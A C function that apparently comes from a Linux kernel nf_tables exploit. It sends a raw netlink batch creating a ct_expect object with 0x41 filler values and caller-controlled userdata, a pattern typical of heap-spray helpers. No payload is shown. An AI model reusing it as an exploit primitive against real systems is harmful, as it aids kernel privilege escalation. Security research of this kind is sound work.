void new_obj_ct_expect(struct nl_sock * socket, char *table_name, char *obj_name, void *udata, uint32_t ulen){
    struct nl_msg * msg = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            NFNL_MSG_BATCH_BEGIN,   // TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST 
    );
    // struct nfgenmsg * h = static_cast<struct nfgenmsg *>(malloc(sizeof(struct nfgenmsg)));
    struct nfgenmsg * h = (struct nfgenmsg *)(malloc(sizeof(struct nfgenmsg)));
    h->nfgen_family = 2;
    h->version = 0;
    h->res_id = NFNL_SUBSYS_NFTABLES;
    memcpy(nlmsg_data(hdr1), h, sizeof(struct nfgenmsg));

    struct nl_msg * msg2 = nlmsg_alloc();
    struct nlmsghdr *hdr2 = nlmsg_put(
            msg2,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            (NFNL_SUBSYS_NFTABLES << 8) | (NFT_MSG_NEWOBJ),// TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST|NLM_F_CREATE 
    );
    // struct nfgenmsg * h2 = static_cast<struct nfgenmsg *>(malloc(sizeof(struct nfgenmsg)));
    struct nfgenmsg * h2 = (struct nfgenmsg *)(malloc(sizeof(struct nfgenmsg)));
    h2->nfgen_family = 2;//NFPROTO_IPV4;
    h2->version = 0;
    h2->res_id = NFNL_SUBSYS_NFTABLES;
    memcpy(nlmsg_data(hdr2), h2, sizeof(struct nfgenmsg));
    struct nl_msg * msg3 = nlmsg_alloc();
    struct nlmsghdr *hdr3 = nlmsg_put(
            msg3,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            NFNL_MSG_BATCH_END,// TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST 
    );
    //init msg
    //create test1
    struct nl_msg *data = nlmsg_alloc();
    // char *a = static_cast<char *>(malloc(0x100));
    char *a = (char *)(malloc(0x100));
    memset(a,0x41,0x100);

    nla_put_u8(data, NFTA_CT_EXPECT_L4PROTO, 6);//IPPROTO_TCP
    nla_put_u16(data, NFTA_CT_EXPECT_DPORT, 0x4141);
    nla_put_u32(data, NFTA_CT_EXPECT_TIMEOUT, 0x41414141);
    nla_put_u8(data, NFTA_CT_EXPECT_SIZE, 0x41);
    nla_put_nested(msg2, NFTA_OBJ_DATA, data);
    nla_put_string(msg2, NFTA_OBJ_NAME, obj_name);
    nla_put_u32(msg2, NFTA_OBJ_TYPE, htonl(NFT_OBJECT_CT_EXPECT));
    nla_put_string(msg2, NFTA_OBJ_TABLE, table_name);
    if(udata != 0)
        nla_put(msg2, NFTA_OBJ_USERDATA, ulen, udata);

    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len) + NLMSG_ALIGN(hdr2->nlmsg_len) + NLMSG_ALIGN(hdr3->nlmsg_len);
    // char *buf = static_cast<char *>(malloc(total_size));
    char *buf = (char *)(malloc(total_size));

    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    memcpy(buf+NLMSG_ALIGN(hdr1->nlmsg_len), hdr2, NLMSG_ALIGN(hdr2->nlmsg_len));
    memcpy(buf+NLMSG_ALIGN(hdr1->nlmsg_len)+NLMSG_ALIGN(hdr2->nlmsg_len), hdr3, NLMSG_ALIGN(hdr3->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    }
}

